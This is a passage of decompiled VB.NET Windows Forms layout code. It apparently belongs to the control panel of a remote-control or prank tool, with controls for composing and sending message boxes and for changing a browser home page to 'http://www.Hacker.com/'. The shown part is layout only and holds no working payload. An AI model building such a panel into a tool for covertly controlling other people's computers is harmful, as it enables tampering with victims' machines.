			Me.Button40.UseVisualStyleBackColor = False
			Me.Button41.BackColor = Global.System.Drawing.Color.Black
			Me.Button41.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button41.ForeColor = Global.System.Drawing.Color.Black
			Dim button45 As Global.System.Windows.Forms.Control = Me.Button41
			location = New Global.System.Drawing.Point(152, 15)
			button45.Location = location
			Me.Button41.Name = "Button41"
			Dim button46 As Global.System.Windows.Forms.Control = Me.Button41
			size = New Global.System.Drawing.Size(20, 91)
			button46.Size = size
			Me.Button41.TabIndex = 25
			Me.Button41.UseVisualStyleBackColor = False
			Me.Button42.BackColor = Global.System.Drawing.Color.Black
			Me.Button42.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button42.ForeColor = Global.System.Drawing.Color.Black
			Dim button47 As Global.System.Windows.Forms.Control = Me.Button42
			location = New Global.System.Drawing.Point(124, 15)
			button47.Location = location
			Me.Button42.Name = "Button42"
			Dim button48 As Global.System.Windows.Forms.Control = Me.Button42
			size = New Global.System.Drawing.Size(20, 91)
			button48.Size = size
			Me.Button42.TabIndex = 24
			Me.Button42.UseVisualStyleBackColor = False
			Me.Button43.BackColor = Global.System.Drawing.Color.Black
			Me.Button43.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button43.ForeColor = Global.System.Drawing.Color.Black
			Dim button49 As Global.System.Windows.Forms.Control = Me.Button43
			location = New Global.System.Drawing.Point(59, 15)
			button49.Location = location
			Me.Button43.Name = "Button43"
			Dim button50 As Global.System.Windows.Forms.Control = Me.Button43
			size = New Global.System.Drawing.Size(20, 91)
			button50.Size = size
			Me.Button43.TabIndex = 29
			Me.Button43.UseVisualStyleBackColor = False
			Me.Button44.BackColor = Global.System.Drawing.Color.Black
			Me.Button44.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button44.ForeColor = Global.System.Drawing.Color.Black
			Dim button51 As Global.System.Windows.Forms.Control = Me.Button44
			location = New Global.System.Drawing.Point(27, 15)
			button51.Location = location
			Me.Button44.Name = "Button44"
			Dim button52 As Global.System.Windows.Forms.Control = Me.Button44
			size = New Global.System.Drawing.Size(20, 91)
			button52.Size = size
			Me.Button44.TabIndex = 28
			Me.Button44.UseVisualStyleBackColor = False
			Me.Button45.BackColor = Global.System.Drawing.Color.White
			Me.Button45.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button45.ForeColor = Global.System.Drawing.Color.Black
			Dim button53 As Global.System.Windows.Forms.Control = Me.Button45
			location = New Global.System.Drawing.Point(225, 15)
			button53.Location = location
			Me.Button45.Name = "Button45"
			Dim button54 As Global.System.Windows.Forms.Control = Me.Button45
			size = New Global.System.Drawing.Size(30, 129)
			button54.Size = size
			Me.Button45.TabIndex = 27
			Me.Button45.UseVisualStyleBackColor = False
			Me.Button46.BackColor = Global.System.Drawing.Color.White
			Me.Button46.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button46.ForeColor = Global.System.Drawing.Color.Black
			Dim button55 As Global.System.Windows.Forms.Control = Me.Button46
			location = New Global.System.Drawing.Point(195, 15)
			button55.Location = location
			Me.Button46.Name = "Button46"
			Dim button56 As Global.System.Windows.Forms.Control = Me.Button46
			size = New Global.System.Drawing.Size(30, 129)
			button56.Size = size
			Me.Button46.TabIndex = 23
			Me.Button46.UseVisualStyleBackColor = False
			Me.Button47.BackColor = Global.System.Drawing.Color.White
			Me.Button47.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button47.ForeColor = Global.System.Drawing.Color.Black
			Dim button57 As Global.System.Windows.Forms.Control = Me.Button47
			location = New Global.System.Drawing.Point(164, 15)
			button57.Location = location
			Me.Button47.Name = "Button47"
			Dim button58 As Global.System.Windows.Forms.Control = Me.Button47
			size = New Global.System.Drawing.Size(30, 129)
			button58.Size = size
			Me.Button47.TabIndex = 19
			Me.Button47.UseVisualStyleBackColor = False
			Me.Button48.BackColor = Global.System.Drawing.Color.White
			Me.Button48.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button48.ForeColor = Global.System.Drawing.Color.Black
			Dim button59 As Global.System.Windows.Forms.Control = Me.Button48
			location = New Global.System.Drawing.Point(132, 15)
			button59.Location = location
			Me.Button48.Name = "Button48"
			Dim button60 As Global.System.Windows.Forms.Control = Me.Button48
			size = New Global.System.Drawing.Size(30, 129)
			button60.Size = size
			Me.Button48.TabIndex = 18
			Me.Button48.UseVisualStyleBackColor = False
			Me.Button49.BackColor = Global.System.Drawing.Color.White
			Me.Button49.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button49.ForeColor = Global.System.Drawing.Color.Black
			Dim button61 As Global.System.Windows.Forms.Control = Me.Button49
			location = New Global.System.Drawing.Point(100, 15)
			button61.Location = location
			Me.Button49.Name = "Button49"
			Dim button62 As Global.System.Windows.Forms.Control = Me.Button49
			size = New Global.System.Drawing.Size(30, 129)
			button62.Size = size
			Me.Button49.TabIndex = 17
			Me.Button49.UseVisualStyleBackColor = False
			Me.Button50.BackColor = Global.System.Drawing.Color.White
			Me.Button50.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button50.ForeColor = Global.System.Drawing.Color.Black
			Dim button63 As Global.System.Windows.Forms.Control = Me.Button50
			location = New Global.System.Drawing.Point(70, 15)
			button63.Location = location
			Me.Button50.Name = "Button50"
			Dim button64 As Global.System.Windows.Forms.Control = Me.Button50
			size = New Global.System.Drawing.Size(30, 129)
			button64.Size = size
			Me.Button50.TabIndex = 22
			Me.Button50.UseVisualStyleBackColor = False
			Me.Button51.BackColor = Global.System.Drawing.Color.White
			Me.Button51.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button51.ForeColor = Global.System.Drawing.Color.Black
			Dim button65 As Global.System.Windows.Forms.Control = Me.Button51
			location = New Global.System.Drawing.Point(37, 15)
			button65.Location = location
			Me.Button51.Name = "Button51"
			Dim button66 As Global.System.Windows.Forms.Control = Me.Button51
			size = New Global.System.Drawing.Size(30, 129)
			button66.Size = size
			Me.Button51.TabIndex = 21
			Me.Button51.UseVisualStyleBackColor = False
			Me.Button52.BackColor = Global.System.Drawing.Color.White
			Me.Button52.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button52.ForeColor = Global.System.Drawing.Color.Black
			Dim button67 As Global.System.Windows.Forms.Control = Me.Button52
			location = New Global.System.Drawing.Point(7, 15)
			button67.Location = location
			Me.Button52.Name = "Button52"
			Dim button68 As Global.System.Windows.Forms.Control = Me.Button52
			size = New Global.System.Drawing.Size(30, 129)
			button68.Size = size
			Me.Button52.TabIndex = 20
			Me.Button52.UseVisualStyleBackColor = False
			Me.Check_Sound.AutoSize = True
			Me.Check_Sound.Checked = True
			Me.Check_Sound.CheckState = Global.System.Windows.Forms.CheckState.Checked
			Dim check_Sound As Global.System.Windows.Forms.Control = Me.Check_Sound
			location = New Global.System.Drawing.Point(37, 373)
			check_Sound.Location = location
			Me.Check_Sound.Name = "Check_Sound"
			Dim check_Sound2 As Global.System.Windows.Forms.Control = Me.Check_Sound
			size = New Global.System.Drawing.Size(62, 18)
			check_Sound2.Size = size
			Me.Check_Sound.TabIndex = 16
			Me.Check_Sound.Text = "Enable"
			Me.Check_Sound.UseVisualStyleBackColor = True
			Me.GroupBox20.Controls.Add(Me.RadioButton10)
			Me.GroupBox20.Controls.Add(Me.RadioButton9)
			Me.GroupBox20.Controls.Add(Me.RadioButton8)
			Me.GroupBox20.Controls.Add(Me.RadioButton7)
			Me.GroupBox20.Controls.Add(Me.RadioButton6)
			Me.GroupBox20.Controls.Add(Me.RadioButton5)
			Me.GroupBox20.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox23 As Global.System.Windows.Forms.Control = Me.GroupBox20
			location = New Global.System.Drawing.Point(449, 1)
			groupBox23.Location = location
			Me.GroupBox20.Name = "GroupBox20"
			Dim groupBox24 As Global.System.Windows.Forms.Control = Me.GroupBox20
			size = New Global.System.Drawing.Size(177, 232)
			groupBox24.Size = size
			Me.GroupBox20.TabIndex = 27
			Me.GroupBox20.TabStop = False
			Me.GroupBox20.Text = "MessageBox Button"
			Me.RadioButton10.AutoSize = True
			Dim radioButton As Global.System.Windows.Forms.Control = Me.RadioButton10
			location = New Global.System.Drawing.Point(7, 146)
			radioButton.Location = location
			Me.RadioButton10.Name = "RadioButton10"
			Dim radioButton2 As Global.System.Windows.Forms.Control = Me.RadioButton10
			size = New Global.System.Drawing.Size(140, 18)
			radioButton2.Size = size
			Me.RadioButton10.TabIndex = 5
			Me.RadioButton10.Text = "Abort | Retry | Cancel"
			Me.RadioButton10.UseVisualStyleBackColor = True
			Me.RadioButton9.AutoSize = True
			Dim radioButton3 As Global.System.Windows.Forms.Control = Me.RadioButton9
			location = New Global.System.Drawing.Point(7, 122)
			radioButton3.Location = location
			Me.RadioButton9.Name = "RadioButton9"
			Dim radioButton4 As Global.System.Windows.Forms.Control = Me.RadioButton9
			size = New Global.System.Drawing.Size(100, 18)
			radioButton4.Size = size
			Me.RadioButton9.TabIndex = 4
			Me.RadioButton9.Text = "Retry | Cancel"
			Me.RadioButton9.UseVisualStyleBackColor = True
			Me.RadioButton8.AutoSize = True
			Dim radioButton5 As Global.System.Windows.Forms.Control = Me.RadioButton8
			location = New Global.System.Drawing.Point(7, 97)
			radioButton5.Location = location
			Me.RadioButton8.Name = "RadioButton8"
			Dim radioButton6 As Global.System.Windows.Forms.Control = Me.RadioButton8
			size = New Global.System.Drawing.Size(86, 18)
			radioButton6.Size = size
			Me.RadioButton8.TabIndex = 3
			Me.RadioButton8.Text = "OK | Cancel"
			Me.RadioButton8.UseVisualStyleBackColor = True
			Me.RadioButton7.AutoSize = True
			Dim radioButton7 As Global.System.Windows.Forms.Control = Me.RadioButton7
			location = New Global.System.Drawing.Point(7, 72)
			radioButton7.Location = location
			Me.RadioButton7.Name = "RadioButton7"
			Dim radioButton8 As Global.System.Windows.Forms.Control = Me.RadioButton7
			size = New Global.System.Drawing.Size(40, 18)
			radioButton8.Size = size
			Me.RadioButton7.TabIndex = 2
			Me.RadioButton7.Text = "OK"
			Me.RadioButton7.UseVisualStyleBackColor = True
			Me.RadioButton6.AutoSize = True
			Dim radioButton9 As Global.System.Windows.Forms.Control = Me.RadioButton6
			location = New Global.System.Drawing.Point(7, 47)
			radioButton9.Location = location
			Me.RadioButton6.Name = "RadioButton6"
			Dim radioButton10 As Global.System.Windows.Forms.Control = Me.RadioButton6
			size = New Global.System.Drawing.Size(114, 18)
			radioButton10.Size = size
			Me.RadioButton6.TabIndex = 1
			Me.RadioButton6.Text = "Yes | No | Cancel"
			Me.RadioButton6.UseVisualStyleBackColor = True
			Me.RadioButton5.AutoSize = True
			Me.RadioButton5.Checked = True
			Dim radioButton11 As Global.System.Windows.Forms.Control = Me.RadioButton5
			location = New Global.System.Drawing.Point(7, 23)
			radioButton11.Location = location
			Me.RadioButton5.Name = "RadioButton5"
			Dim radioButton12 As Global.System.Windows.Forms.Control = Me.RadioButton5
			size = New Global.System.Drawing.Size(68, 18)
			radioButton12.Size = size
			Me.RadioButton5.TabIndex = 0
			Me.RadioButton5.TabStop = True
			Me.RadioButton5.Text = "Yes | No"
			Me.RadioButton5.UseVisualStyleBackColor = True
			Me.GroupBox22.Controls.Add(Me.RadioButton4)
			Me.GroupBox22.Controls.Add(Me.PictureBox4)
			Me.GroupBox22.Controls.Add(Me.RadioButton3)
			Me.GroupBox22.Controls.Add(Me.PictureBox3)
			Me.GroupBox22.Controls.Add(Me.RadioButton2)
			Me.GroupBox22.Controls.Add(Me.PictureBox2)
			Me.GroupBox22.Controls.Add(Me.RadioButton1)
			Me.GroupBox22.Controls.Add(Me.PictureBox1)
			Me.GroupBox22.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox25 As Global.System.Windows.Forms.Control = Me.GroupBox22
			location = New Global.System.Drawing.Point(1, 1)
			groupBox25.Location = location
			Me.GroupBox22.Name = "GroupBox22"
			Dim groupBox26 As Global.System.Windows.Forms.Control = Me.GroupBox22
			size = New Global.System.Drawing.Size(439, 106)
			groupBox26.Size = size
			Me.GroupBox22.TabIndex = 25
			Me.GroupBox22.TabStop = False
			Me.GroupBox22.Text = "MessageBox Icon"
			Me.RadioButton4.AutoSize = True
			Dim radioButton13 As Global.System.Windows.Forms.Control = Me.RadioButton4
			location = New Global.System.Drawing.Point(369, 78)
			radioButton13.Location = location
			Me.RadioButton4.Name = "RadioButton4"
			Dim radioButton14 As Global.System.Windows.Forms.Control = Me.RadioButton4
			size = New Global.System.Drawing.Size(53, 18)
			radioButton14.Size = size
			Me.RadioButton4.TabIndex = 7
			Me.RadioButton4.TabStop = True
			Me.RadioButton4.Text = "Error"
			Me.RadioButton4.UseVisualStyleBackColor = True
			Me.PictureBox4.Image = CType(componentResourceManager.GetObject("PictureBox4.Image"), Global.System.Drawing.Image)
			Dim pictureBox As Global.System.Windows.Forms.Control = Me.PictureBox4
			location = New Global.System.Drawing.Point(369, 23)
			pictureBox.Location = location
			Me.PictureBox4.Name = "PictureBox4"
			Dim pictureBox2 As Global.System.Windows.Forms.Control = Me.PictureBox4
			size = New Global.System.Drawing.Size(43, 42)
			pictureBox2.Size = size
			Me.PictureBox4.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.PictureBox4.TabIndex = 6
			Me.PictureBox4.TabStop = False
			Me.RadioButton3.AutoSize = True
			Dim radioButton15 As Global.System.Windows.Forms.Control = Me.RadioButton3
			location = New Global.System.Drawing.Point(247, 78)
			radioButton15.Location = location
			Me.RadioButton3.Name = "RadioButton3"
			Dim radioButton16 As Global.System.Windows.Forms.Control = Me.RadioButton3
			size = New Global.System.Drawing.Size(70, 18)
			radioButton16.Size = size
			Me.RadioButton3.TabIndex = 5
			Me.RadioButton3.TabStop = True
			Me.RadioButton3.Text = "Warning"
			Me.RadioButton3.UseVisualStyleBackColor = True
			Me.PictureBox3.Image = CType(componentResourceManager.GetObject("PictureBox3.Image"), Global.System.Drawing.Image)
			Dim pictureBox3 As Global.System.Windows.Forms.Control = Me.PictureBox3
			location = New Global.System.Drawing.Point(261, 23)
			pictureBox3.Location = location
			Me.PictureBox3.Name = "PictureBox3"
			Dim pictureBox4 As Global.System.Windows.Forms.Control = Me.PictureBox3
			size = New Global.System.Drawing.Size(43, 42)
			pictureBox4.Size = size
			Me.PictureBox3.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.PictureBox3.TabIndex = 4
			Me.PictureBox3.TabStop = False
			Me.RadioButton2.AutoSize = True
			Dim radioButton17 As Global.System.Windows.Forms.Control = Me.RadioButton2
			location = New Global.System.Drawing.Point(133, 78)
			radioButton17.Location = location
			Me.RadioButton2.Name = "RadioButton2"
			Dim radioButton18 As Global.System.Windows.Forms.Control = Me.RadioButton2
			size = New Global.System.Drawing.Size(75, 18)
			radioButton18.Size = size
			Me.RadioButton2.TabIndex = 3
			Me.RadioButton2.TabStop = True
			Me.RadioButton2.Text = "Question"
			Me.RadioButton2.UseVisualStyleBackColor = True
			Me.PictureBox2.Image = CType(componentResourceManager.GetObject("PictureBox2.Image"), Global.System.Drawing.Image)
			Dim pictureBox5 As Global.System.Windows.Forms.Control = Me.PictureBox2
			location = New Global.System.Drawing.Point(149, 23)
			pictureBox5.Location = location
			Me.PictureBox2.Name = "PictureBox2"
			Dim pictureBox6 As Global.System.Windows.Forms.Control = Me.PictureBox2
			size = New Global.System.Drawing.Size(43, 42)
			pictureBox6.Size = size
			Me.PictureBox2.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.PictureBox2.TabIndex = 2
			Me.PictureBox2.TabStop = False
			Me.RadioButton1.AutoSize = True
			Me.RadioButton1.Checked = True
			Dim radioButton19 As Global.System.Windows.Forms.Control = Me.RadioButton1
			location = New Global.System.Drawing.Point(16, 78)
			radioButton19.Location = location
			Me.RadioButton1.Name = "RadioButton1"
			Dim radioButton20 As Global.System.Windows.Forms.Control = Me.RadioButton1
			size = New Global.System.Drawing.Size(89, 18)
			radioButton20.Size = size
			Me.RadioButton1.TabIndex = 1
			Me.RadioButton1.TabStop = True
			Me.RadioButton1.Text = "Information"
			Me.RadioButton1.UseVisualStyleBackColor = True
			Me.PictureBox1.Image = CType(componentResourceManager.GetObject("PictureBox1.Image"), Global.System.Drawing.Image)
			Dim pictureBox7 As Global.System.Windows.Forms.Control = Me.PictureBox1
			location = New Global.System.Drawing.Point(40, 23)
			pictureBox7.Location = location
			Me.PictureBox1.Name = "PictureBox1"
			Dim pictureBox8 As Global.System.Windows.Forms.Control = Me.PictureBox1
			size = New Global.System.Drawing.Size(43, 42)
			pictureBox8.Size = size
			Me.PictureBox1.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.StretchImage
			Me.PictureBox1.TabIndex = 0
			Me.PictureBox1.TabStop = False
			Me.GroupBox21.Controls.Add(Me.TextBox5)
			Me.GroupBox21.Controls.Add(Me.TextBox6)
			Me.GroupBox21.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox27 As Global.System.Windows.Forms.Control = Me.GroupBox21
			location = New Global.System.Drawing.Point(1, 113)
			groupBox27.Location = location
			Me.GroupBox21.Name = "GroupBox21"
			Dim groupBox28 As Global.System.Windows.Forms.Control = Me.GroupBox21
			size = New Global.System.Drawing.Size(439, 210)
			groupBox28.Size = size
			Me.GroupBox21.TabIndex = 26
			Me.GroupBox21.TabStop = False
			Me.GroupBox21.Text = "MessageBox Content"
			Me.TextBox5.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox5.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.TextBox5.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox3 As Global.System.Windows.Forms.Control = Me.TextBox5
			location = New Global.System.Drawing.Point(7, 53)
			textBox3.Location = location
			Me.TextBox5.Multiline = True
			Me.TextBox5.Name = "TextBox5"
			Dim textBox4 As Global.System.Windows.Forms.Control = Me.TextBox5
			size = New Global.System.Drawing.Size(424, 150)
			textBox4.Size = size
			Me.TextBox5.TabIndex = 1
			Me.TextBox6.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox6.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.TextBox6.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox5 As Global.System.Windows.Forms.Control = Me.TextBox6
			location = New Global.System.Drawing.Point(7, 23)
			textBox5.Location = location
			Me.TextBox6.Name = "TextBox6"
			Dim textBox6 As Global.System.Windows.Forms.Control = Me.TextBox6
			size = New Global.System.Drawing.Size(424, 20)
			textBox6.Size = size
			Me.TextBox6.TabIndex = 0
			Me.Button39.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button39.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.Button39.ImageAlign = Global.System.Drawing.ContentAlignment.MiddleRight
			Dim button69 As Global.System.Windows.Forms.Control = Me.Button39
			location = New Global.System.Drawing.Point(450, 240)
			button69.Location = location
			Me.Button39.Name = "Button39"
			Dim button70 As Global.System.Windows.Forms.Control = Me.Button39
			size = New Global.System.Drawing.Size(177, 39)
			button70.Size = size
			Me.Button39.TabIndex = 24
			Me.Button39.Text = "Send"
			Me.Button39.TextImageRelation = Global.System.Windows.Forms.TextImageRelation.ImageBeforeText
			Me.Button39.UseVisualStyleBackColor = True
			Me.Button38.FlatStyle = Global.System.Windows.Forms.FlatStyle.Flat
			Me.Button38.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.Button38.ImageAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Dim button71 As Global.System.Windows.Forms.Control = Me.Button38
			location = New Global.System.Drawing.Point(450, 285)
			button71.Location = location
			Me.Button38.Name = "Button38"
			Dim button72 As Global.System.Windows.Forms.Control = Me.Button38
			size = New Global.System.Drawing.Size(177, 39)
			button72.Size = size
			Me.Button38.TabIndex = 23
			Me.Button38.Text = "    Test"
			Me.Button38.UseVisualStyleBackColor = True
			Me.Panel1.Controls.Add(Me.GroupBox22)
			Me.Panel1.Controls.Add(Me.GroupBox20)
			Me.Panel1.Controls.Add(Me.Button38)
			Me.Panel1.Controls.Add(Me.Button39)
			Me.Panel1.Controls.Add(Me.GroupBox21)
			Me.Panel1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim panel As Global.System.Windows.Forms.Control = Me.Panel1
			location = New Global.System.Drawing.Point(109, 12)
			panel.Location = location
			Me.Panel1.Name = "Panel1"
			Dim panel2 As Global.System.Windows.Forms.Control = Me.Panel1
			size = New Global.System.Drawing.Size(638, 327)
			panel2.Size = size
			Me.Panel1.TabIndex = 28
			Me.Panel1.Visible = False
			Me.Panel2.Controls.Add(Me.GroupBox16)
			Me.Panel2.Controls.Add(Me.GroupBox3)
			Me.Panel2.Controls.Add(Me.GroupBox18)
			Me.Panel2.Controls.Add(Me.GroupBox9)
			Me.Panel2.Controls.Add(Me.GroupBox25)
			Me.Panel2.Controls.Add(Me.GroupBox1)
			Me.Panel2.Controls.Add(Me.Button56)
			Me.Panel2.Controls.Add(Me.GroupBox8)
			Me.Panel2.Controls.Add(Me.GroupBox7)
			Me.Panel2.Controls.Add(Me.GroupBox2)
			Me.Panel2.Controls.Add(Me.GroupBox10)
			Me.Panel2.Controls.Add(Me.GroupBox19)
			Me.Panel2.Controls.Add(Me.GroupBox6)
			Me.Panel2.Controls.Add(Me.GroupBox11)
			Me.Panel2.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim panel3 As Global.System.Windows.Forms.Control = Me.Panel2
			location = New Global.System.Drawing.Point(110, 12)
			panel3.Location = location
			Me.Panel2.Name = "Panel2"
			Dim panel4 As Global.System.Windows.Forms.Control = Me.Panel2
			size = New Global.System.Drawing.Size(629, 329)
			panel4.Size = size
			Me.Panel2.TabIndex = 29
			Me.GroupBox16.Controls.Add(Me.Button34)
			Me.GroupBox16.Controls.Add(Me.TextBox1)
			Me.GroupBox16.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox29 As Global.System.Windows.Forms.Control = Me.GroupBox16
			location = New Global.System.Drawing.Point(351, 73)
			groupBox29.Location = location
			Me.GroupBox16.Name = "GroupBox16"
			Dim groupBox30 As Global.System.Windows.Forms.Control = Me.GroupBox16
			size = New Global.System.Drawing.Size(272, 49)
			groupBox30.Size = size
			Me.GroupBox16.TabIndex = 33
			Me.GroupBox16.TabStop = False
			Me.GroupBox16.Text = "IE Home Page"
			Me.Button34.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button34.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button73 As Global.System.Windows.Forms.Control = Me.Button34
			location = New Global.System.Drawing.Point(206, 15)
			button73.Location = location
			Me.Button34.Name = "Button34"
			Dim button74 As Global.System.Windows.Forms.Control = Me.Button34
			size = New Global.System.Drawing.Size(61, 25)
			button74.Size = size
			Me.Button34.TabIndex = 13
			Me.Button34.Text = "Change"
			Me.Button34.UseVisualStyleBackColor = True
			Me.TextBox1.BackColor = Global.System.Drawing.Color.Black
			Me.TextBox1.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.TextBox1.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim textBox7 As Global.System.Windows.Forms.Control = Me.TextBox1
			location = New Global.System.Drawing.Point(9, 20)
			textBox7.Location = location
			Me.TextBox1.Name = "TextBox1"
			Dim textBox8 As Global.System.Windows.Forms.Control = Me.TextBox1
			size = New Global.System.Drawing.Size(191, 20)
			textBox8.Size = size
			Me.TextBox1.TabIndex = 0
			Me.TextBox1.Text = "http://www.Hacker.com/"
			Me.GroupBox3.Controls.Add(Me.Button5)
			Me.GroupBox3.Controls.Add(Me.Button6)
			Me.GroupBox3.Controls.Add(Me.Button7)
			Me.GroupBox3.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim groupBox31 As Global.System.Windows.Forms.Control = Me.GroupBox3
			location = New Global.System.Drawing.Point(1, 0)
			groupBox31.Location = location
			Me.GroupBox3.Name = "GroupBox3"
			Dim groupBox32 As Global.System.Windows.Forms.Control = Me.GroupBox3
			size = New Global.System.Drawing.Size(77, 155)
			groupBox32.Size = size
			Me.GroupBox3.TabIndex = 22
			Me.GroupBox3.TabStop = False
			Me.GroupBox3.Text = "Computer"
			Me.Button5.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button5.Image = CType(componentResourceManager.GetObject("Button5.Image"), Global.System.Drawing.Image)
			Dim button75 As Global.System.Windows.Forms.Control = Me.Button5
			location = New Global.System.Drawing.Point(9, 105)
			button75.Location = location
			Me.Button5.Name = "Button5"
			Dim button76 As Global.System.Windows.Forms.Control = Me.Button5
			size = New Global.System.Drawing.Size(58, 40)
			button76.Size = size
			Me.Button5.TabIndex = 8
			Me.Button5.UseVisualStyleBackColor = True
			Me.Button6.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button6.Image = CType(componentResourceManager.GetObject("Button6.Image"), Global.System.Drawing.Image)
			Dim button77 As Global.System.Windows.Forms.Control = Me.Button6
			location = New Global.System.Drawing.Point(9, 18)
			button77.Location = location
			Me.Button6.Name = "Button6"
			Dim button78 As Global.System.Windows.Forms.Control = Me.Button6
			size = New Global.System.Drawing.Size(58, 40)
			button78.Size = size
			Me.Button6.TabIndex = 6
			Me.Button6.UseVisualStyleBackColor = True
			Me.Button7.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button7.Image = CType(componentResourceManager.GetObject("Button7.Image"), Global.System.Drawing.Image)
			Dim button79 As Global.System.Windows.Forms.Control = Me.Button7
			location = New Global.System.Drawing.Point(9, 59)
			button79.Location = location
			Me.Button7.Name = "Button7"
			Dim button80 As Global.System.Windows.Forms.Control = Me.Button7
			size = New Global.System.Drawing.Size(58, 40)
			button80.Size = size
			Me.Button7.TabIndex = 7
			Me.Button7.UseVisualStyleBackColor = True
			Me.Panel4.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.Panel4.Controls.Add(Me.Button53)
			Dim panel5 As Global.System.Windows.Forms.Control = Me.Panel4
			location = New Global.System.Drawing.Point(10, 12)
			panel5.Location = location
			Me.Panel4.Name = "Panel4"
			Dim panel6 As Global.System.Windows.Forms.Control = Me.Panel4
			size = New Global.System.Drawing.Size(94, 29)
			panel6.Size = size
			Me.Panel4.TabIndex = 31
			Me.Button53.Dock = Global.System.Windows.Forms.DockStyle.Fill
			Me.Button53.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button53.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button81 As Global.System.Windows.Forms.Control = Me.Button53
			location = New Global.System.Drawing.Point(0, 0)
			button81.Location = location
			Me.Button53.Name = "Button53"
			Dim button82 As Global.System.Windows.Forms.Control = Me.Button53
			size = New Global.System.Drawing.Size(92, 27)
			button82.Size = size
			Me.Button53.TabIndex = 21
			Me.Button53.Text = "MessageBox"
			Me.Button53.UseVisualStyleBackColor = True
			Me.Panel6.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.Panel6.Controls.Add(Me.Button55)
			Dim panel7 As Global.System.Windows.Forms.Control = Me.Panel6
			location = New Global.System.Drawing.Point(10, 47)
			panel7.Location = location
			Me.Panel6.Name = "Panel6"
			Dim panel8 As Global.System.Windows.Forms.Control = Me.Panel6
			size = New Global.System.Drawing.Size(94, 29)
			panel8.Size = size
			Me.Panel6.TabIndex = 32
			Me.Button55.Dock = Global.System.Windows.Forms.DockStyle.Fill
			Me.Button55.FlatStyle = Global.System.Windows.Forms.FlatStyle.Popup
			Me.Button55.ForeColor = Global.System.Drawing.Color.LimeGreen
			Dim button83 As Global.System.Windows.Forms.Control = Me.Button55
			location = New Global.System.Drawing.Point(0, 0)
			button83.Location = location
			Me.Button55.Name = "Button55"
			Dim button84 As Global.System.Windows.Forms.Control = Me.Button55
			size = New Global.System.Drawing.Size(92, 27)
			button84.Size = size
			Me.Button55.TabIndex = 21
			Me.Button55.Text = "More"
			Me.Button55.UseVisualStyleBackColor = True
			Me.Panel7.BorderStyle = Global.System.Windows.Forms.BorderStyle.FixedSingle
			Me.Panel7.Controls.Add(Me.Check_Sound)
			Me.Panel7.Dock = Global.System.Windows.Forms.DockStyle.Left
			Dim panel9 As Global.System.Windows.Forms.Control = Me.Panel7
			location = New Global.System.Drawing.Point(0, 0)
			panel9.Location = location
			Me.Panel7.Name = "Panel7"
			Dim panel10 As Global.System.Windows.Forms.Control = Me.Panel7
			size = New Global.System.Drawing.Size(100, 346)
			panel10.Size = size
			Me.Panel7.TabIndex = 30
			Dim autoScaleDimensions As Global.System.Drawing.SizeF = New Global.System.Drawing.SizeF(7F, 14F)
			Me.AutoScaleDimensions = autoScaleDimensions
			Me.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			Me.BackColor = Global.System.Drawing.Color.Black
			size = New Global.System.Drawing.Size(740, 346)
			Me.ClientSize = size
			Me.Controls.Add(Me.Panel4)
			Me.Controls.Add(Me.Panel2)
			Me.Controls.Add(Me.Panel6)
			Me.Controls.Add(Me.Panel7)
			Me.Controls.Add(Me.Panel1)
			Me.Font = New Global.System.Drawing.Font("Arial", 8F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ForeColor = Global.System.Drawing.Color.LimeGreen
			Me.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.FixedSingle
			Me.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			Me.MaximizeBox = False
			size = New Global.System.Drawing.Size(746, 375)
			Me.MaximumSize = size
